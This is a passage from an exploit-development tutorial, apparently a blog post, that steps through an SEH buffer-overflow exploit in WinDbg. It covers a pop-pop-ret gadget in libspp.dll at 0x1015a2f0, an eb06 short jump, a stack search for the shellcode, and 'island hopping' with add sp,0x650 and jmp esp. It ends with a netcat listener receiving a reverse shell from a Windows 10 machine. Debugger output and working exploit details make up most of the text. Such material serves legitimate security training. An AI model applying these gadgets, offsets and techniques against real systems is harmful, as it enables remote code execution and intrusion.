an exception, the first handler won\u0026rsquo;t be able to manage it and jump to the second handler, which we have modified. the handler address is at our set of pop, pop, ret instructions, and that should point to our shellcode, which we saw that is stored as the third parameter on the stack.\nlet\u0026rsquo;s put a breapoint on our \u0026ldquo;pop, pop, ret\u0026rdquo; chain:\n0:010\u0026gt; bp 0x1015a2f0 0:010\u0026gt; g breakpoint 0 hit eax=00000000 ebx=00000000 ecx=1015a2f0 edx=770c6270 esi=00000000 edi=00000000 eip=1015a2f0 esp=008df440 ebp=008df460 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246 libspp!pcre_exec+0x16460: 1015a2f0 58 pop eax 0:010\u0026gt; r eax=00000000 ebx=00000000 ecx=1015a2f0 edx=770c6270 esi=00000000 edi=00000000 eip=1015a2f0 esp=008df440 ebp=008df460 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246 libspp!pcre_exec+0x16460: 1015a2f0 58 pop eax 0:010\u0026gt; t eax=770c6252 ebx=00000000 ecx=1015a2f0 edx=770c6270 esi=00000000 edi=00000000 eip=1015a2f1 esp=008df444 ebp=008df460 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246 libspp!pcre_exec+0x16461: 1015a2f1 5b pop ebx 0:010\u0026gt; t eax=770c6252 ebx=008df540 ecx=1015a2f0 edx=770c6270 esi=00000000 edi=00000000 eip=1015a2f2 esp=008df448 ebp=008df460 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246 libspp!pcre_exec+0x16462: 1015a2f2 c3 ret now the next step will be a \u0026ldquo;ret\u0026rdquo;, which will return the instruction flow to what the top of the stack has. let\u0026rsquo;s see the top of the stack:\n0:010\u0026gt; dd poi(esp) 008dff44 41414141 1015a2f0 43434343 43434343 008dff54 43434343 43434343 43434343 43434343 008dff64 43434343 43434343 43434343 43434343 008dff74 43434343 43434343 43434343 43434343 008dff84 43434343 43434343 43434343 43434343 008dff94 43434343 43434343 43434343 43434343 008dffa4 43434343 43434343 43434343 43434343 008dffb4 43434343 43434343 43434343 43434343 after executing the ret instruction, we will point to 008dff44, which is at the start of the _exception_registration_record structure. that structure had 41414141 as the \u0026ldquo;next\u0026rdquo; member address, and the \u0026ldquo;handler\u0026rdquo; address. the next is our shellcode.\nthe bad thing is that right now we don\u0026rsquo;t exactly land on our shellcode. we land on the following instructions:\n41 41 41 41 (or whatever we put in our buffer) 4 bytes corresponding of the pop, pop, ret address we used our shellcode. if we analyze the instructions, we see that the \u0026ldquo;pop, pop, ret\u0026rdquo; address is malformed and takes 2 more bytes, resulting in another instruction when executed as code instead of an address. because this instruction uses part of our buffer as a destination adress, and this address is not mapped, this will trigger an access violation and break our exploit:\n0:007\u0026gt; t eax=771a6252 ebx=0091f540 ecx=1015a2f0 edx=771a6270 esi=00000000 edi=00000000 eip=0091ff44 esp=0091f44c ebp=0091f460 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246 0091ff44 41 inc ecx 0:007\u0026gt; u eip l8 0091ff44 41 inc ecx 0091ff45 41 inc ecx 0091ff46 41 inc ecx 0091ff47 41 inc ecx 0091ff48 f0a215104343 lock mov byte ptr ds:[43431015h],al 0091ff4e 43 inc ebx 0091ff4f 43 inc ebx 0091ff50 43 inc ebx but remember we have 4 bytes corresponding to the \u0026ldquo;next\u0026rdquo; parameter that right now are 41 41 41 41. we can replace those bytes with an instruction that will jump to our shellcode, skipping the four bytes of the pop, pop, ret memory address which cause problems. this is known as a \u0026ldquo;short jump\u0026rdquo; in assembly, also known as a short relative jump. the first opcode of the short jump is 0xeb and the second opcode is the offset in bytes. the offset in bytes is 0x00 to 0x7f for forward short jumps, and 0x80 to 0xff to backwards short jumps.\nlet\u0026rsquo;s see the formula of the short jump: jmp address + 2 + second_byte_value = next_instruction_address\nit\u0026rsquo;s basically a jmp (eb) + 2 bytes + the offset in bytes we want to jump. here are some examples:\naddress code instruction formula examples 0100 eb 03 jmp 0105 100h + 2 + 03h = 105h 0152 eb 23 jmp 0177 152h + 2 + 23h = 177h 0173 eb 47 jmp 01bc 173h + 2 + 47h = 1bch 0200 eb 7f jmp 0281 200h + 2 + 7fh = 281h in the previous example, we want to jump to 0091ff4c, which is the start of our shellcode.\n0:007\u0026gt; dds eip l4 0091ff44 41414141 0091ff48 1015a2f0 libspp!pcre_exec+0x16460 0091ff4c 43434343 0091ff50 43434343 we can replace the instruction in 0091ff44 to a \u0026ldquo;jmp 0x0091ff4c\u0026rdquo;. we can do this in wingdb with the \u0026ldquo;a\u0026rdquo; command, replacing the actual eip for our instruction, like live patching:\n0:007\u0026gt; dds eip l4 0091ff44 41414141 0091ff48 1015a2f0 libspp!pcre_exec+0x16460 0091ff4c 43434343 0091ff50 43434343 0:007\u0026gt; a 0091ff44 jmp 0x0091ff4c jmp 0x0091ff4c let\u0026rsquo;s inspect how the debugger translated such jmp instruction, and confirm it\u0026rsquo;s a short jump:\n0:007\u0026gt; u eip 0091ff44 eb06 jmp 0091ff4c 0091ff46 41 inc ecx 0091ff47 41 inc ecx 0091ff48 f0a215104343 lock mov byte ptr ds:[43431015h],al 0091ff4e 43 inc ebx 0091ff4f 43 inc ebx 0091ff50 43 inc ebx 0091ff51 43 inc ebx it\u0026rsquo;s a eb06, meaning that it jumps 4 bytes offset (remember that was eb + 02 bytes + offset bytes). exactly, it\u0026rsquo;s skipping the 4 bytes corresponding to the pop, pop, ret instruction at 0091ff48!\n0:007\u0026gt; dds eip l4 0091ff44 414106eb 0091ff48 1015a2f0 libspp!pcre_exec+0x16460 0091ff4c 43434343 0091ff50 43434343 0:007\u0026gt; u eip 0091ff44 eb06 jmp 0091ff4c 0091ff46 41 inc ecx 0091ff47 41 inc ecx 0091ff48 f0a215104343 lock mov byte ptr ds:[43431015h],al 0091ff4e 43 inc ebx 0091ff4f 43 inc ebx 0091ff50 43 inc ebx 0091ff51 43 inc ebx instead of 41414141, we have to insert eb069090 (2 nops at the end). remember that we have to insert them in little endian. but as they are nops, we can do 90 90 eb 06, or eb 06 90 90.\nreplacing this in our payload leads us to now doing a nop, nop, and the relative jump to our code:\n0:008\u0026gt; t eax=771a6252 ebx=0172f540 ecx=1015a2f0 edx=771a6270 esi=00000000 edi=00000000 eip=1015a2f2 esp=0172f448 ebp=0172f460 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246 libspp!pcre_exec+0x16462: 1015a2f2 c3 ret 0:008\u0026gt; t eax=771a6252 ebx=0172f540 ecx=1015a2f0 edx=771a6270 esi=00000000 edi=00000000 eip=0172ff44 esp=0172f44c ebp=0172f460 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246 0172ff44 90 nop 0:008\u0026gt; t eax=771a6252 ebx=0172f540 ecx=1015a2f0 edx=771a6270 esi=00000000 edi=00000000 eip=0172ff45 esp=0172f44c ebp=0172f460 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246 0172ff45 90 nop 0:008\u0026gt; t eax=771a6252 ebx=0172f540 ecx=1015a2f0 edx=771a6270 esi=00000000 edi=00000000 eip=0172ff46 esp=0172f44c ebp=0172f460 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246 0172ff46 eb06 jmp 0172ff4e but we don\u0026rsquo;t land on our shellcode directly:\n0091ff3f 41 inc ecx 0091ff40 41 inc ecx 0091ff41 41 inc ecx 0091ff42 41 inc ecx 0091ff43 41 inc ecx 0091ff44 90 nop 0091ff45 90 nop 0091ff46 eb06 jmp 0091ff4e 0091ff48 f0a215103930 lock mov byte ptr ds:[30391015h],al 0091ff4e 3930 cmp dword ptr [eax],esi ds:0023:77ef6252=00258b64 0091ff50 3930 cmp dword ptr [eax],esi 0091ff52 3930 cmp dword ptr [eax],esi 0091ff54 3930 cmp dword ptr [eax],esi 0091ff56 3930 cmp dword ptr [eax],esi 0091ff58 3930 cmp dword ptr [eax],esi 0091ff5a 3930 cmp dword ptr [eax],esi 0091ff5c 3930 cmp dword ptr [eax],esi 0091ff5e 3930 cmp dword ptr [eax],esi 0091ff60 3930 cmp dword ptr [eax],esi 0091ff62 3930 cmp dword ptr [eax],esi 0091ff64 3930 cmp dword ptr [eax],esi 0091ff66 3930 cmp dword ptr [eax],esi 0091ff68 3930 cmp dword ptr [eax],esi but we know how to jump to it! now, let\u0026rsquo;s search our shellcode. the teb has two fields that indicate us the top and the bottom of the stack. these are the stackbase and stacklimit:\n0:007\u0026gt; !teb teb at 00387000 exceptionlist: 0091f454 stackbase: 01900000 stacklimit: 018fe000 subsystemtib: 00000000 fiberdata: 00001e00 arbitraryuserpointer: 00000000 self: 00387000 environmentpointer: 00000000 clientid: 00000900 . 00001dec rpchandle: 00000000 tls storage: 00639cf0 peb address: 00376000 lasterrorvalue: 0 laststatusvalue: c000000d count owned locks: 0 harderrormode: 0 so our shellcode must be in between both fields. let\u0026rsquo;s search for it in windbg with the following command:\ns -b \u0026lt;stacklimit\u0026gt; \u0026lt;stackbase\u0026gt; \u0026lt;pattern\u0026gt; 0:008\u0026gt; !teb teb at 002a7000 exceptionlist: 0174f454 stackbase: 01750000 stacklimit: 0174e000 subsystemtib: 00000000 fiberdata: 00001e00 arbitraryuserpointer: 00000000 self: 002a7000 environmentpointer: 00000000 clientid: 00001d14 . 00001e68 rpchandle: 00000000 tls storage: 004f96f0 peb address: 0029c000 lasterrorvalue: 0 laststatusvalue: c000000d count owned locks: 0 harderrormode: 0 0:008\u0026gt; s -b 0174e000 01750000 90 90 b8 c2 0174faa0 90 90 b8 c2 aa b1 eb da-d8 d9 74 24 f4 5b 31 c9 ..........t$.[1. 0174ff5c 90 90 b8 c2 aa b1 eb da-d8 d9 74 24 f4 5b 31 c9 ..........t$.[1. there are two places where our shellcode is stored! first place is just after the short jump:\n0174ff45 90 nop 0174ff46 eb06 jmp 0174ff4e 0174ff48 f0a215109090 lock mov byte ptr ds:[90901015h],al 0174ff4e 90 nop 0174ff4f 90 nop 0174ff50 90 nop 0174ff51 90 nop 0174ff52 90 nop 0174ff53 90 nop 0174ff54 90 nop 0174ff55 90 nop 0174ff56 90 nop 0174ff57 90 nop 0174ff58 90 nop 0174ff59 90 nop 0174ff5a 90 nop 0174ff5b 90 nop 0174ff5c 90 nop 0174ff5d 90 nop 0174ff5e b8c2aab1eb mov eax,0ebb1aac2h // start of our shellcode 0174ff63 the other place is at the end of the stack:\n0:008\u0026gt; dds 0174faa0 l60 0174faa0 c2b89090 0174faa4 daebb1aa 0174faa8 2474d9d8 0174faac c9315bf4 0174fab0 eb8352b1 0174fab4 0e4331fc 0174fab8 53a48103 0174fabc 1151f91e 0174fac0 76a201e1 combase!mega__midl_typeformatstring+0x1561 0174fac4 b693e46b but one important thing! if we take a look at both places, we can see that the place near the short jump does not have all the shellcode but only a part. indeed, if we perform a search of the last bytes of the shellcode, we find that they are only present in 1 place:\n0:008\u0026gt; s -b 0174e000 01750000 e4 ae 6f 0174fbfe e4 ae 6f 31 bc 77 8a 8c-ef 3d 00 c0 29 00 00 00 ..o1.w...=..)... so, we have to jump to the other place where the complete shellcode is stored.\ncombined with the short jump, we are going to do a technique called \u0026ldquo;island hopping\u0026rdquo;. island hopping consists in:\nwe have an address which we want to jump. we calculate the offset from the stack pointer to such address. in order to reach our shellcode, the stack pointer will have to be added that offset. point the stack pointer to our shellcode by adding such offset that we calculated! perform a jmp esp to jump to the stack pointer, which is pointing at our shellcode. to calculate the offset, first we put eip after the short jump. then, we calculate the offset of our shellcode to the esp:\n0:008\u0026gt; s -b 0080e000 00810000 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 b8 c2 0080fa92 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................ 0080ff4e 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................ 0:008\u0026gt; s -b 0080e000 00810000 e4 ae 6f 0080fbfe e4 ae 6f 31 bc 77 e7 e4-38 b3 00 e0 39 00 00 00 ..o1.w..8...9... 0:008\u0026gt; ? 0080fa92 - esp evaluate expression: 1606 = 00000646 note: this offset might not be consistent between application resets or devices. if the offset changes slightly each time we launch our exploit, we must put a bigger nop sled prior to our shellcode! so always put nops if you have space!\nnow, we have to add 0x849 (always in hex) to esp. let\u0026rsquo;s forge the command:\nmsf-nasm_shell nasm \u0026gt; add esp, 0x646 00000000 81c446060000 add esp,0x646 nasm \u0026gt; add esp, 1606 00000000 81c446060000 add esp,0x646 nasm \u0026gt; jmp esp 00000000 ffe4 jmp esp very big note! with this jump, the stack won\u0026rsquo;t be aligned. the stack must be aligned in a multiple of 16 bytes. what we are doing by adding 1606 bytes to esp is unalign it, as 1606 is not a multiple of 16. we will turn from an aligned stack to an unaligned one. indeed, if we don\u0026rsquo;t align the stack we won\u0026rsquo;t land on our nops and shellcode. look where we will land:\n0:008\u0026gt; dds 0179fa92 0179fa92 46c48166 0179fa96 90e4ff06 0179fa9a 90909090 0179fa9e 90909090 0179faa2 90909090 0179faa6 b8909090 0179faaa ebb1aac2 0179faae 74d9d8da 0179fab2 315bf424 0179fab6 8352b1c9 to fix that, we will add 1616 bytes instead of 1606, which is a multiple of 16 bytes, to keep the stack aligned. in compensation, we can add some nops if we think that the extra bytes are going to make us not landing on our shellcode.\nnasm \u0026gt; add esp, 1616 00000000 81c450060000 add esp,0x650 note: check that this instruction does not includes badchars! if it does, a good tip is to substitute the add esp instruction, which uses all the 32 bits of the register, to add sp, which only uses the 16 least significant bits. this would change the instruction and might not contain badchars! our add esp instruction contains badchars, as it has two \u0026ldquo;00\u0026quot;s at the end that are neccesary as we are leading with instructions on top of each other. so, let\u0026rsquo;s try add sp, and our value:\nnasm \u0026gt; add sp, 0x650 00000000 6681c45006 add sp,0x650 after checking if this had badchars, it does not. there are two \u0026ldquo;zeros\u0026rdquo; in a row but each zero is from a different byte (50 - 06). we can still jump to esp and not sp as this will add the lower bytes into esp.\nonce we insert such payload, we can see that after the short jump we perform the island hopping:\n0170ff44 90 nop 0170ff45 90 nop 0170ff46 eb06 jmp 0170ff4e 0170ff48 f0a215109090 lock mov byte ptr ds:[90901015h],al 0170ff4e 6681c45006 add sp,650h 0170ff53 ffe4 jmp esp {0170fa9c} 0170ff55 90 nop if we inspect esp, we see that all our shellcode is there and we land exactly there:\neax=77c36252 ebx=0170f540 ecx=1015a2f0 edx=77c36270 esi=00000000 edi=00000000 eip=0170ff4e esp=0170f44c ebp=0170f460 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246 0170ff4e 6681c45006 add sp,650h 0:008\u0026gt; t eax=77c36252 ebx=0170f540 ecx=1015a2f0 edx=77c36270 esi=00000000 edi=00000000 eip=0170ff53 esp=0170fa9c ebp=0170f460 iopl=0 nv up ei ng nz na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000286 0170ff53 ffe4 jmp esp {0170fa9c} 0:008\u0026gt; dds 0170fa9c 0170fa9c 90909090 0170faa0 90909090 0170faa4 90909090 0170faa8 aac2b890 and if we put a reverse shell we obtain it:\nsudo nc -lvp 443 [sudo] password for kali: listening on [any] 443 ... connect to [192.168.122.211] from desktop-78jqlbm [192.168.122.113] 49776 microsoft windows [version 10.0.19045.5737] (c) microsoft corporation. all rights reserved. c:\\windows\\system32\u0026gt; ","title":""}]
}

